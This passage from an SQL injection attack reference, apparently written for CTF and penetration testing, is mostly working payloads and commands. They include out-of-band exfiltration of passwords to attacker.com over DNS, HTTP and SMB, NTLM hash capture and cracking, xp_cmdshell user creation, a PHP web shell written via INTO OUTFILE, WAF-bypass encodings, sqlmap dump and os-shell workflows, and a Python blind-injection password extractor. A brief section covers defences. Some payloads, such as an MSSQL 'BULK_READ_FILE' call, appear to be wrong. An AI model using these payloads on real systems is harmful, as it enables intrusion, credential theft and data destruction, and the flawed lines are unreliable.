# Each query contains portion of data

# Example: Extract 100-byte password
# Split into 10 DNS queries, 10 bytes each (subdomain length limits)

# Payload iteration

for i in {0..9}; do curl "http://target.com/page?id=1' UNION SELECT 1, CONCAT(SUBSTRING((SELECT password FROM users LIMIT 1),$((i*10+1)),10), '.$i.attacker.com')-- -" done

# Attacker receives DNS queries:

# 4d3a8f9b2c.0.attacker.com

# 7e1f6d5a9b.1.attacker.com

# ...

# 2b8c7d9f1e.9.attacker.com

# Reconstruct data from queries

grep "attacker.com" dns.log | sort -t. -k2 -n | cut -d. -f1 | tr -d '\n' > password.txt
````

**DNS length limitations:**

```bash
# DNS label maximum: 63 characters
# Full DNS name maximum: 253 characters
# Subdomain hierarchy: label.label.label.domain.com

# Exfiltrate large data by chunking
# 250 characters password requires 4 DNS queries (63 chars each)

# Attacker chunks data:
SUBSTRING(data, 1, 60).1.attacker.com
SUBSTRING(data, 61, 60).2.attacker.com
SUBSTRING(data, 121, 60).3.attacker.com
SUBSTRING(data, 181, 70).4.attacker.com

# Reassemble at attacker's DNS logs
````

---

### HTTP-Based Out-of-Band SQLi

Database sends HTTP requests to attacker-controlled web server; data exfiltrated via URL parameters or POST body.

**MySQL HTTP exfiltration via LOAD_FILE (local file inclusion combined with HTTP):**

```sql
-- MySQL can't natively HTTP; requires sys_exec or UDF
-- [Unverified] Specific MySQL builds support HTTP UDF

SELECT LOAD_FILE('\\\\attacker.com\\share\\file');
-- Windows UNC path triggers SMB/HTTP connection to attacker.com
```

**MSSQL HTTP exfiltration via xp_cmdshell:**

```bash
curl "http://target.com/page?id=1; EXEC xp_cmdshell 'curl http://attacker.com/?data=' + (SELECT password FROM users WHERE id=1)"

# MSSQL executes curl command; password sent to attacker's server
# Attacker captures HTTP request:
# GET /?data=admin_password_hash HTTP/1.1
```

**Oracle HTTP exfiltration via UTL_HTTP:**

```sql
SELECT UTL_HTTP.request('http://attacker.com/?data=' || (SELECT password FROM users WHERE id=1)) FROM dual;

-- Oracle sends HTTP request to attacker.com
-- URL contains: http://attacker.com/?data=admin_password_hash
```

**PostgreSQL HTTP exfiltration via dblink or copy to program:**

```sql
-- dblink extension for external database connections
CREATE EXTENSION dblink;
SELECT dblink_connect('host=attacker.com dbname=postgres user=postgres password=pass');

-- Alternative: copy to program with curl
COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl http://attacker.com/?data=$(cat)';
```

**Practical HTTP out-of-band setup:**

```bash
# Step 1: Set up HTTP listener on attacker's server
# Using netcat (simple TCP listener)
nc -lvnp 80

# Using Python HTTP server
python3 -m http.server 80

# Using Apache/Nginx with logging
# HTTP logs capture exfiltrated data

# Step 2: Craft payload sending HTTP request
curl "http://target.com/page?id=1' UNION SELECT 1, UTL_HTTP.request('http://attacker.com/?data=' || (SELECT password FROM users WHERE id=1)) FROM dual-- -"

# Step 3: Monitor HTTP server for incoming requests
# Access logs show:
# 192.0.2.50 - - [16/Oct/2025:14:32:45] "GET /?data=admin_password_hash HTTP/1.1" 200 -

# Step 4: Extract data from logs
grep "/?data=" /var/log/apache2/access.log | sed 's/.*data=//' | sed 's/ .*//' > extracted_passwords.txt
```

**HTTP vs DNS comparison:**

[Inference] HTTP out-of-band exfiltration:

- Advantages: Higher bandwidth, fewer length restrictions, POST body supports large payloads
- Disadvantages: Requires xp_cmdshell or equivalent, often blocked by firewalls

DNS out-of-band exfiltration:

- Advantages: DNS rarely blocked, works in restricted environments, stealthy
- Disadvantages: Length restrictions (63 chars/label), requires chunking for large data

---

### SMB-Based Out-of-Band SQLi (Windows-specific)

MSSQL on Windows can access UNC paths; attacker captures NTLM credentials or exfiltrates data via SMB.

**NTLM credential capture via UNC path:**

```bash
curl "http://target.com/page?id=1'; EXEC xp_dirtree '\\\\attacker.com\\share'-- -"

# MSSQL server attempts to access \\attacker.com\share
# Windows sends NTLM authentication to attacker's SMB server
# Attacker captures NTLM hash

# Using Responder to capture NTLM
responder -I eth0 -v

# Responder logs show:
# [SMB] NTLMv2-SSP Hash: dbuser::DOMAIN:1234567890abcdef...
```

**Data exfiltration via SMB file write:**

```bash
curl "http://target.com/page?id=1'; EXEC xp_cmdshell 'echo ' + (SELECT password FROM users WHERE id=1) + ' > \\\\attacker.com\\share\\data.txt'-- -"

# MSSQL writes password to attacker's SMB share
# Attacker retrieves file from SMB server
```

**Practical SMB out-of-band setup:**

```bash
# Step 1: Set up SMB server on attacker's machine
# Using Impacket smbserver
impacket-smbserver share /tmp/smb_share -smb2support

# Step 2: Craft payload accessing UNC path
curl "http://target.com/page?id=1'; EXEC xp_dirtree '\\\\attacker.com\\share'-- -"

# Step 3: Capture NTLM hash with Responder
responder -I eth0 -v

# Step 4: Crack NTLM hash
# Using hashcat
hashcat -m 5600 ntlm_hash.txt /usr/share/wordlists/rockyou.txt

# Alternatively, use exfiltrated data directly
cat /tmp/smb_share/data.txt
```

**SMB limitations:**

```bash
# SMB often blocked by firewalls (port 445)
# Only viable on Windows networks
# Requires SQL Server running with privileges to access network shares
# [Inference] Less common in modern environments; HTTP/DNS more reliable
```

---

### Out-of-Band Detection and Prerequisites

**Detecting out-of-band capability:**

```bash
# Test if database can resolve DNS
curl "http://target.com/page?id=1' AND (SELECT UTL_HTTP.request('http://canary.attacker.com')) FROM dual-- -"

# Monitor attacker's DNS/HTTP server for incoming connection
# If connection received: out-of-band possible
# No connection: out-of-band blocked or database lacks capability
```

**Firewall and network restrictions:**

```bash
# Test outbound connectivity on common ports
# DNS (53/UDP)
# HTTP (80/TCP)
# HTTPS (443/TCP)
# SMB (445/TCP)

# If all blocked, out-of-band impossible; resort to blind SQLi
```

**Database-specific out-of-band support:**

```bash
# MySQL: Limited native support; requires UDF or sys_exec
# PostgreSQL: Limited; dblink or copy to program
# MSSQL: Strong support; xp_cmdshell, xp_dirtree, UTL_HTTP equivalents
# Oracle: Strong support; UTL_HTTP, UTL_TCP packages
# SQLite: No network functionality; out-of-band impossible

# [Inference] MSSQL and Oracle most viable for out-of-band; MySQL/PostgreSQL require extensions
```

---

## SQL Injection Tools and Automation

### SQLmap

SQLmap is automated SQL injection tool; supports all injection types, multiple databases, and advanced techniques.

**Basic usage:**

```bash
# Test single URL parameter
sqlmap -u "http://example.com/page?id=1"

# Specify parameter to test
sqlmap -u "http://example.com/page?id=1&sort=name" -p id

# Test POST data
sqlmap -u "http://example.com/login" --data "username=admin&password=test"

# Test cookie parameters
sqlmap -u "http://example.com/page" --cookie="SESSIONID=abc123"

# Test HTTP headers
sqlmap -u "http://example.com/page" --headers="X-Forwarded-For: 192.168.1.1"
```

**Database enumeration:**

```bash
# Detect database type and version
sqlmap -u "http://example.com/page?id=1" --banner

# List available databases
sqlmap -u "http://example.com/page?id=1" --dbs

# List tables in specific database
sqlmap -u "http://example.com/page?id=1" -D webapp_db --tables

# List columns in specific table
sqlmap -u "http://example.com/page?id=1" -D webapp_db -T users --columns

# Dump specific table
sqlmap -u "http://example.com/page?id=1" -D webapp_db -T users --dump

# Dump specific columns
sqlmap -u "http://example.com/page?id=1" -D webapp_db -T users -C username,password --dump
```

**Advanced options:**

```bash
# Specify injection technique
sqlmap -u "http://example.com/page?id=1" --technique=BEUST
# B: Boolean-based blind
# E: Error-based
# U: Union-based
# S: Stacked queries
# T: Time-based blind

# Increase verbosity
sqlmap -u "http://example.com/page?id=1" -v 3

# Use specific DBMS
sqlmap -u "http://example.com/page?id=1" --dbms=mysql

# Bypass WAF with tamper scripts
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,between

# Execute custom SQL
sqlmap -u "http://example.com/page?id=1" --sql-query="SELECT @@version"

# OS shell access (if privileges allow)
sqlmap -u "http://example.com/page?id=1" --os-shell
```

**SQLmap tamper scripts (WAF bypass):**

```bash
# space2comment: Replaces spaces with /**/ comments
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment

# between: Replaces ">" with "NOT BETWEEN 0 AND #"
sqlmap -u "http://example.com/page?id=1" --tamper=between

# randomcase: Random case mutation
sqlmap -u "http://example.com/page?id=1" --tamper=randomcase

# charencode: URL-encodes all characters
sqlmap -u "http://example.com/page?id=1" --tamper=charencode

# Multiple tamper scripts
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,between,randomcase
```

**SQLmap with authentication:**

```bash
# HTTP Basic authentication
sqlmap -u "http://example.com/page?id=1" --auth-type=Basic --auth-cred="admin:password"

# Cookie-based authentication
# Step 1: Authenticate via browser, capture cookie
# Step 2: Use cookie in sqlmap
sqlmap -u "http://example.com/page?id=1" --cookie="SESSIONID=abc123xyz"

# Form-based authentication (requires specific configuration)
sqlmap -u "http://example.com/page?id=1" --auth-type=POST --auth-cred="admin:password" --auth-url="http://example.com/login"
```

**Practical SQLmap workflow:**

```bash
# Step 1: Test for SQL injection
sqlmap -u "http://example.com/page?id=1" --batch --risk=3 --level=5
# --batch: Non-interactive (auto-answer prompts)
# --risk: 1-3 (higher = more aggressive tests)
# --level: 1-5 (higher = more thorough)

# Step 2: If injection found, enumerate databases
sqlmap -u "http://example.com/page?id=1" --dbs --batch

# Step 3: Enumerate tables in target database
sqlmap -u "http://example.com/page?id=1" -D webapp_db --tables --batch

# Step 4: Dump sensitive table
sqlmap -u "http://example.com/page?id=1" -D webapp_db -T users --dump --batch

# Step 5: Attempt OS shell (if privileges allow)
sqlmap -u "http://example.com/page?id=1" --os-shell --batch
```

**SQLmap limitations:**

```bash
# SQLmap may be detected by IDS/IPS
# Heavy traffic volume (thousands of requests)
# Distinctive User-Agent and request patterns
# WAFs specifically fingerprint sqlmap

# Mitigation: Use tamper scripts, custom User-Agent, proxies
sqlmap -u "http://example.com/page?id=1" \
  --tamper=space2comment,between \
  --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  --proxy="http://proxy:8080" \
  --random-agent \
  --delay=2 \
  --batch
```

---

### Manual SQL Injection vs Automated Tools

**Manual injection advantages:**

- Precise control over payloads (avoids detection)
- Faster for simple injections (no tool overhead)
- Stealthy (fewer requests)
- Learning opportunity (understanding database behavior)

**Automated tool advantages:**

- Comprehensive testing (all injection types)
- Database-agnostic (handles multiple DBMS)
- Complex payloads (WAF bypass, encoding)
- Time-saving for large-scale enumeration

[Inference] Manual injection preferred for CTF challenges (fewer requests, precise exploitation); automated tools better for penetration testing (comprehensive coverage).

---

## SQL Injection Prevention and Detection

### Prepared Statements (Parameterized Queries)

**Vulnerable code (PHP):**

```php
<?php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $query);
?>
```

**Secure code using prepared statements:**

```php
<?php
$id = $_GET['id'];
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);  // "i" = integer
$stmt->execute();
$result = $stmt->get_result();
?>
```

**Prepared statements separate SQL structure from data; user input never interpreted as SQL.**

---

### Input Validation and Sanitization

```php
<?php
// Whitelist validation for expected input types
$id = $_GET['id'];
if (!is_numeric($id)) {
    die("Invalid input");
}

// Escape special characters (less secure than prepared statements)
$username = mysqli_real_escape_string($conn, $_POST['username']);
$query = "SELECT * FROM users WHERE username = '$username'";
?>
```

[Unverified] Input validation alone is insufficient; prepared statements must be primary defense.

---

### Least Privilege Database Accounts

```bash
# Database account for web application should have minimal privileges
# No DROP, CREATE, ALTER permissions
# Only SELECT, INSERT, UPDATE on specific tables

# MySQL example
GRANT SELECT, INSERT, UPDATE ON webapp_db.* TO 'webapp_user'@'localhost' IDENTIFIED BY 'password';
REVOKE ALL PRIVILEGES ON *.* FROM 'webapp_user'@'localhost';

# Prevent stacked queries
# Prepared statements naturally prevent; raw queries vulnerable
```

---

### Web Application Firewall (WAF) Rules

```bash
# ModSecurity rule example (blocks common SQLi patterns)
SecRule ARGS "@rx (union|select|from|where|or|and|\-\-|\/\*)" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection Attempt'"

# [Unverified] WAF rules bypassable; defense-in-depth required
```

---

### Detection via Logging and Monitoring

```bash
# Enable query logging (MySQL)
SET GLOBAL general_log = 'ON';
SET GLOBAL log_output = 'TABLE';
SELECT * FROM mysql.general_log WHERE argument LIKE '%UNION%';

# Monitor for suspicious patterns
# Multiple failed authentication attempts
# Queries with unusual patterns (UNION, --, /**/)
# Excessive query durations (time-based blind SQLi)

# [Inference] Detection supplements prevention; cannot replace secure coding
```

---

## Database-Specific SQL Injection Techniques

### MySQL-Specific Techniques

**Information schema queries:**

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = database();
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
```

**File operations (requires FILE privilege):**

```sql
-- Read files
SELECT LOAD_FILE('/etc/passwd');

-- Write files
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

**Version and system information:**

```sql
SELECT VERSION();           -- MySQL version
SELECT USER();              -- Current user
SELECT DATABASE();          -- Current database
SELECT @@datadir;           -- Data directory path
SELECT @@version_compile_os;  -- Operating system
```

**MySQL comments:**

```sql
-- Standard comment
SELECT * FROM users WHERE id = 1 -- comment

/* Multi-line comment */
SELECT * FROM users WHERE id = 1 /* comment */ AND username = 'admin'

/*!50000 Conditional comment */
SELECT * FROM users WHERE id = 1 /*!50000 UNION SELECT 1,2,3*/
-- Executes only on MySQL 5.0.0+
```

---

### PostgreSQL-Specific Techniques

**Information schema:**

```sql
SELECT tablename FROM pg_tables WHERE schemaname = 'public';
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
```

**System information:**

```sql
SELECT version();
SELECT current_user;
SELECT current_database();
```

**File operations (requires superuser):**

```sql
-- Copy query results to file
COPY (SELECT password FROM users) TO '/tmp/passwords.txt';

-- Copy file to table
COPY users FROM '/tmp/userdata.txt';
```

**PostgreSQL stacked queries:**

```sql
SELECT * FROM users WHERE id = 1; DROP TABLE users;--
-- Semicolon allows multiple queries; requires privileges
```

---

### MSSQL-Specific Techniques

**Information schema:**

```sql
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';
```

**System information:**

```sql
SELECT @@version;
SELECT SYSTEM_USER;
SELECT DB_NAME();
SELECT SERVERPROPERTY('ProductVersion');
```

**xp_cmdshell (OS command execution):**

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user attacker password /add';
```

**Linked servers (pivot to other databases):**

```sql
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=remote_server;Trusted_Connection=yes;', 'SELECT * FROM remote_db.dbo.users');
```

---

### Oracle-Specific Techniques

**Information schema:**

```sql
SELECT table_name FROM user_tables;
SELECT column_name FROM user_tab_columns WHERE table_name = 'USERS';
```

**System information:**

```sql
SELECT * FROM v$version;
SELECT user FROM dual;
SELECT SYS_CONTEXT('USERENV', 'CURRENT_SCHEMA') FROM dual;
```

**Oracle-specific functions:**

```sql
-- UTL_HTTP (HTTP requests)
SELECT UTL_HTTP.request('http://attacker.com/?data=' || password) FROM users WHERE id=1;

-- DBMS_LOCK.SLEEP (time-based blind)
SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual;
```

**Oracle comments:**

```sql
SELECT * FROM users WHERE id = 1 -- comment
SELECT * FROM users WHERE id = 1 /* comment */
```

---

**Important subtopics for continued study:**

- **Second-order SQL injection**: Stored input later executed in SQL context
- **NoSQL injection**: MongoDB, CouchDB, Redis injection techniques
- **XML/XPath injection**: Similar principles, different syntax
- **ORM injection**: Hibernate, SQLAlchemy vulnerabilities despite abstraction
- **SQL injection in stored procedures**: Pre-compiled code still vulnerable if dynamic SQL used

## Second-Order SQLi

Second-order SQL injection occurs when user input is stored in a database, then later retrieved and used in a SQL query without proper sanitization. The injection payload executes in a different context than initial input, evading input validation and WAF rules.

**Vulnerable Pattern**

```php
// First request: Input stored
$username = $_POST['username'];
$query = "INSERT INTO users (username, email) VALUES ('$username', 'user@example.com')";
mysqli_query($conn, $query);

// Second request: Stored data retrieved and used
$user = mysqli_fetch_assoc(mysqli_query($conn, "SELECT * FROM users WHERE id = 1"));
$query = "SELECT * FROM posts WHERE author = '" . $user['username'] . "'";
mysqli_result = mysqli_query($conn, $query);
```

**Exploitation Technique**

```bash
# Step 1: Inject payload during registration/profile update
# Payload stored in database without immediate execution
username = admin' OR '1'='1

# Step 2: Trigger second query where stored data is used
# When admin's profile retrieved and used in SQL query
# SELECT * FROM posts WHERE author = 'admin' OR '1'='1'
# Returns all posts instead of admin's posts only

# Practical exploitation
curl -X POST https://target.com/register \
  -d "username=admin' UNION SELECT password FROM admin_users -- &email=attacker@example.com"

# Wait for payload to be used in subsequent queries
# Access profile/dashboard to trigger second-order injection
curl https://target.com/profile
```

**Detection via Time-Based Blind SQLi**

Second-order SQLi often blindâ€”no error messages returned. Use time delays:

```bash
# Inject payload that triggers delay when executed
username = admin' AND SLEEP(5) -- 

# Register/insert payload
curl -X POST https://target.com/register \
  -d "username=admin' AND SLEEP(5) -- &email=attacker@example.com"

# Trigger second query and observe response time
time curl https://target.com/profile
# If response delayed by 5+ seconds, second-order SQLi confirmed
```

**Exfiltration via Second-Order SQLi**

```bash
# Inject UNION SELECT to extract data
username = admin' UNION SELECT GROUP_CONCAT(password) FROM users WHERE '1'='1

# Data stored in username field
# When username field displayed, extracted data visible

# Or use INTO OUTFILE for file write
username = admin'; SELECT * INTO OUTFILE '/var/www/html/output.txt' FROM users; -- 

# File written to web root, accessible via HTTP
curl https://target.com/output.txt
```

**Chained Second-Order Attack**

```
Attacker Input â†’ Stored in DB â†’ Retrieved by another user â†’ Executed in query â†’ Data extraction
```

Example workflow:

```bash
# 1. Attacker comments on forum post with SQLi payload
payload = "test' UNION SELECT admin_password FROM admins -- "
curl -X POST https://target.com/forum/post/1/comment \
  -d "content=$payload"

# 2. Administrator views forum post comments
# 3. Application displays comments: SELECT * FROM comments WHERE post_id = 1
# 4. Comment content used in another query (e.g., logging, analytics)
# 5. SQLi payload executes in admin context with elevated privileges
```

---

## Bypassing WAF Filters

Web Application Firewalls (WAFs) detect/block SQL injection patterns. Bypass techniques exploit rule gaps and encoding weaknesses.

**Comment-Based Evasion**

```bash
# Standard SQLi detected
' OR '1'='1

# Bypass: Insert comments
' /*!50000OR*/ '1'='1
' /*+ OR */ '1'='1
' /*!*/OR/*!*/'1'='1

# MySQL version-specific comments
' /*!40000AND*/ 1=1
' /*!50000UNION*/ SELECT 1,2,3

# Multi-line comments
' /**/OR/**/1=1
' /**/UNION/**/SELECT/**/1,2,3
```

**Case Variation**

```bash
# Keyword detection often case-sensitive
SELECT â†’ SeLeCt, select, SELECT
UNION â†’ Union, uNiOn, union

# WAF rule: WHERE clause detects "UNION SELECT"
# Bypass: WHERE clause detects "union select" (lowercase)
' UnIoN SeLeCt 1,2,3 -- 

# URL encoding variations
%55NION %53ELECT â†’ UNION SELECT
```

**Null Byte Injection**

```bash
# Terminate string early with null byte
' OR '1'='1%00

# Some WAFs strip special characters, leaving injection intact
SELECT * FROM users WHERE id='123%00' OR '1'='1'
```

**Character Encoding Bypass**

```bash
# Double encoding
' â†’ %27 â†’ %2527

# Unicode encoding
' â†’ \u0027
UNION â†’ \u0055NION

# HTML encoding
' â†’ &#39; â†’ &#x27;

# Hex encoding (MySQL)
UNION â†’ 0x554e494f4e

curl "https://target.com/search?q=' UNION SELECT 1,2,3 WHERE (SELECT * FROM (SELECT(SLEEP(5)))a) -- "
```

**Whitespace Variations**

```bash
# Standard whitespace filtered
' OR 1=1

# Alternative whitespace characters
' %09OR%091=1       # Tab character
' %0aOR%0a1=1       # Line feed
' %0dOR%0d1=1       # Carriage return
' %0bOR%0b1=1       # Vertical tab

# Multiline bypass
'
OR
1=1
```

**Logical Bypass via Operators**

```bash
# Filter blocks "OR 1=1"
# Alternative: && (AND)
' AND 1=1 -- 

# Filter blocks common operators
# Alternative: BETWEEN
' AND 1 BETWEEN 1 AND 1 -- 
' AND 1 IN (1,2,3) -- 
' AND 1 LIKE 1 -- 
```

**Function-Based Evasion**

```bash
# UNION SELECT blocked
# Alternative: Use subqueries
' AND (SELECT 1)=(SELECT 1) -- 

# SELECT blocked
# Alternative: Information schema queries
' AND 1=(SELECT COUNT(*) FROM information_schema.tables) -- 

# Nested functions to obscure intent
' OR 1=CAST(0x31 AS INT) -- 
' OR 1=CONVERT(INT, 0x31) -- 
```

**WAF Timing-Based Bypass**

```bash
# Time-based SLEEP() blocked
# Alternative: Heavy queries causing timeout
' AND (SELECT COUNT(*) FROM information_schema.tables t1, information_schema.tables t2) > 0 -- 

# Database locks
' AND BENCHMARK(50000000, MD5('test')) -- 
```

**Protocol-Based Bypass**

```bash
# Some WAFs inspect HTTP but not HTTPS
# Redirect HTTP â†’ HTTPS to bypass inspection

# Unusual HTTP methods
# GET bypassed but POST allowed (or vice versa)
curl -X POST https://target.com/search?q=normal
# Submit injection in body instead of URL parameters

# Cookie-based injection (sometimes less monitored)
curl -H "Cookie: search=' UNION SELECT ..." https://target.com
```

---

## SQLi in Different Contexts

**WHERE Clause Injection**

Standard injection in SELECT queries:

```bash
# Vulnerable query
SELECT * FROM users WHERE username = 'INPUT'

# Injection
' OR '1'='1
# Query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
# Returns all users

# Extract via UNION
' UNION SELECT table_name FROM information_schema.tables -- 
# Query returns all table names instead of user data

# Time-based blind
' AND SLEEP(5) -- 
# Observe response delay to confirm vulnerability

# Payload
curl "https://target.com/user?id=1' UNION SELECT version(), database(), user() -- "
```

**INSERT Clause Injection**

Insert queries vulnerable when user input not properly escaped:

```bash
# Vulnerable query
INSERT INTO comments (user_id, content) VALUES ('123', 'INPUT')

# Injection: Modify table structure or extract data
', (SELECT password FROM users LIMIT 1), 123); -- 

# Results in:
INSERT INTO comments (user_id, content) VALUES ('123', '', (SELECT password FROM users LIMIT 1), 123); -- 

# Extract data via subquery
', (SELECT CONCAT(username, ':', password) FROM users LIMIT 1), 123); -- 

# Practical exploitation
curl -X POST https://target.com/comment \
  -d "content=', (SELECT password FROM users WHERE id=1), 0); -- "
```

**UPDATE Clause Injection**

Update queries vulnerable when SET clause not parameterized:

```bash
# Vulnerable query
UPDATE users SET email = 'INPUT' WHERE id = 123

# Injection: Modify other fields
' WHERE id=1 OR 1=1; UPDATE users SET role='admin' WHERE '1'='1

# Or via SET clause
admin@example.com', role='admin', name='Hacked' WHERE id=1; -- 

# Results in:
UPDATE users SET email = 'admin@example.com', role='admin', name='Hacked' WHERE id=1; -- 

# Exploit to elevate privileges
curl -X POST https://target.com/profile/update \
  -d "email=attacker@evil.com', role='admin' WHERE id=1; -- "

# Verify privilege escalation
curl https://target.com/admin
```

**DELETE Clause Injection**

Delete queries vulnerable when WHERE clause not parameterized:

```bash
# Vulnerable query
DELETE FROM posts WHERE id = INPUT

# Injection: Delete all records
1 OR 1=1
# Query becomes: DELETE FROM posts WHERE id = 1 OR 1=1
# Deletes entire table

# Extract data before deletion (using trigger or logging)
# Some systems log DELETE queries with affected data

# Practical exploitation
curl "https://target.com/post/1/delete?confirm=' OR '1'='1"

# Verify deletion
curl https://target.com/posts
# All posts deleted
```

**ORDER BY Injection**

Order by clauses often vulnerable to injection:

```bash
# Vulnerable query
SELECT * FROM users ORDER BY INPUT

# Injection: Determine column count
1 UNION SELECT 1,2,3 -- 

# Extract data via UNION
1 UNION SELECT username, password, email FROM users -- 

# Time-based blind
1, (SELECT SLEEP(5)) -- 

# Exploit
curl "https://target.com/users?sort=username' UNION SELECT database(), version(), user() -- "
```

**LIMIT Clause Injection**

LIMIT clauses restrict result sets but can be exploited:

```bash
# Vulnerable query
SELECT * FROM users LIMIT INPUT, 10

# Injection: UNION SELECT
10 UNION SELECT 1,2,3 -- 

# Offset-based enumeration
10 OFFSET 0
10 OFFSET 1
10 OFFSET 2
# Returns different result sets, useful for data extraction

# Time-based blind
10, (SELECT SLEEP(5)) -- 

# Exploit
curl "https://target.com/users?page=1' UNION SELECT username, password, email FROM admins LIMIT 10"
```

---

## Database Detection and Enumeration

**Database Fingerprinting**

Identify database type via error messages and behavior:

```bash
# MySQL error signature
' AND extractvalue(1, concat(0x7e, version())) -- 

# MSSQL error signature
' AND 1=CONVERT(INT, @@version) -- 

# PostgreSQL error signature
' AND 1=CAST(version() AS INT) -- 

# Oracle error signature
' AND CTXSYS.DRITHSX.SN(user) -- 

# SQLite error signature
' AND 1=CAST(sqlite_version() AS INT) -- 
```

**Version Detection**

```bash
# MySQL
SELECT @@version
SELECT version()
SELECT @@global.version

# MSSQL
SELECT @@version
SELECT SERVERPROPERTY('ProductVersion')

# PostgreSQL
SELECT version()

# Oracle
SELECT banner FROM v$version

# SQLite
SELECT sqlite_version()

# Enumerate via UNION
' UNION SELECT version() -- 
' UNION SELECT @@version -- 
' UNION SELECT sqlite_version() -- 
```

**Enumerate Databases**

```bash
# MySQL
SELECT schema_name FROM information_schema.schemata
SELECT database()

# MSSQL
SELECT name FROM sys.databases
SELECT DB_NAME()

# PostgreSQL
SELECT datname FROM pg_database

# Oracle
SELECT name FROM v$database

# SQLite
SELECT name FROM sqlite_master WHERE type='database'

# Exploit example
curl "https://target.com/search?q=' UNION SELECT schema_name FROM information_schema.schemata -- "
```

**Enumerate Tables**

```bash
# MySQL
SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name'

# MSSQL
SELECT name FROM sysobjects WHERE xtype='U'
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES

# PostgreSQL
SELECT table_name FROM information_schema.tables WHERE table_schema='public'

# Oracle
SELECT table_name FROM user_tables

# SQLite
SELECT name FROM sqlite_master WHERE type='table'

# Practical enumeration
curl "https://target.com/search?q=' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() -- "
```

**Enumerate Columns**

```bash
# MySQL
SELECT column_name FROM information_schema.columns WHERE table_name='users'

# MSSQL
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT * FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')

# PostgreSQL
SELECT column_name FROM information_schema.columns WHERE table_name='users'

# Oracle
SELECT column_name FROM user_tab_columns WHERE table_name='USERS'

# SQLite
PRAGMA table_info(users)

# Extract via UNION
curl "https://target.com/search?q=' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' -- "
```

**Extract Data**

```bash
# Standard data extraction
' UNION SELECT username, password FROM users -- 

# Multiple columns concatenation
' UNION SELECT CONCAT(username, ':', password, ':', email), 2, 3 FROM users -- 

# Group concatenation for single row output
' UNION SELECT GROUP_CONCAT(CONCAT(username, ':', password)), 2, 3 FROM users -- 

# Blind SQLi data extraction via character-by-character comparison
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0) -- 
# If response delayed, first character is 'a'

# Practical exploitation
python3 << 'EOF'
import requests
import time
import string

url = "https://target.com/search?q="
chars = string.ascii_letters + string.digits + "!@#$%^&*()"
password = ""

for position in range(1, 33):  # Assume 32-char password
    for char in chars:
        payload = f"' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),{position},1)='{char}', SLEEP(3), 0) -- "
        start = time.time()
        response = requests.get(url + payload, timeout=5)
        elapsed = time.time() - start
        
        if elapsed >= 3:
            password += char
            print(f"Position {position}: {char} (password so far: {password})")
            break
EOF
```

**File System Access**

```bash
# MySQL LOAD_FILE (read files)
' UNION SELECT LOAD_FILE('/etc/passwd') -- 

# MySQL INTO OUTFILE (write files)
' UNION SELECT username, password INTO OUTFILE '/var/www/html/shell.php' FROM users -- 

# MSSQL xp_cmdshell (OS command execution)
'; EXEC xp_cmdshell 'whoami' -- 

# MSSQL file read
' UNION SELECT CONVERT(VARCHAR(MAX), BULK_READ_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')) -- 

# Practical exploitation
curl "https://target.com/search?q=' UNION SELECT 1, LOAD_FILE('/etc/passwd') -- "
```

---

## Data Extraction Techniques

### Union-Based SQLi

**Union-based SQLi combines results from injected queries with original query results.**

**Requirements:**

- Same number of columns in both queries
- Compatible data types in corresponding columns

**1. Determine Column Count:**

```sql
-- Order By method
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
-- Continue until error appears

-- Union NULL method
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

**URL Encoding:**

```bash
# Test column count
curl "http://target.com/product?id=1' ORDER BY 1-- -"
curl "http://target.com/product?id=1' ORDER BY 2-- -"
curl "http://target.com/product?id=1' ORDER BY 3-- -"

# Union technique
curl "http://target.com/product?id=1' UNION SELECT NULL,NULL,NULL-- -"
```

**2. Identify Injectable Columns:**

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -

-- With numbers
' UNION SELECT 1,2,3-- -
-- Check which numbers appear in response
```

**3. Extract Database Information:**

**MySQL:**

```sql
-- Database version
' UNION SELECT NULL,@@version,NULL-- -

-- Current database
' UNION SELECT NULL,database(),NULL-- -

-- List databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata-- -

-- List tables
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='database_name'-- -

-- List columns
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Extract data
' UNION SELECT NULL,username,password FROM users-- -

-- Concatenate multiple columns
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users-- -
```

